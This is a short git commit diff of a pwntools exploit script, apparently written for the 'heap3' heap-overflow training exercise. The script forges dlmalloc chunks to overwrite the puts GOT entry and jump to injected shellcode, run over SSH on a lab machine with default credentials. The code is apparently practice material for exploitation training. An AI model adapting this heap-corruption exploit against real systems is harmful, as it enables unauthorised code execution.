05561240f7acf63ca57829a4e6278301e467fdb4
Zubin Mithra <zubin.mithra@gmail.com>
2015-08-25 21:36:45 +0530

    commit

--- newsploit.py
+++ newsploit.py
@@ -4,15 +4,15 @@ from pwn import *
 from heaplib import HeapFrame
 
 
-
 def main():
     e = ELF("./heap3")
     puts_got = e.got['puts']
+    shellcode_address = 0x0804c00c
 
     shell = ssh(user="user", password="user", host="192.168.5.199", port=22)
 
     arg1 = "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3"
-    arg2, arg3 = HeapFrame("dlmalloc", puts_got, 0x0804c00c).get_exploit()
+    arg2, arg3 = HeapFrame("dlmalloc", puts_got, shellcode_address).get_exploit()
     arg2 = "A"*32 + arg2
 
     p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
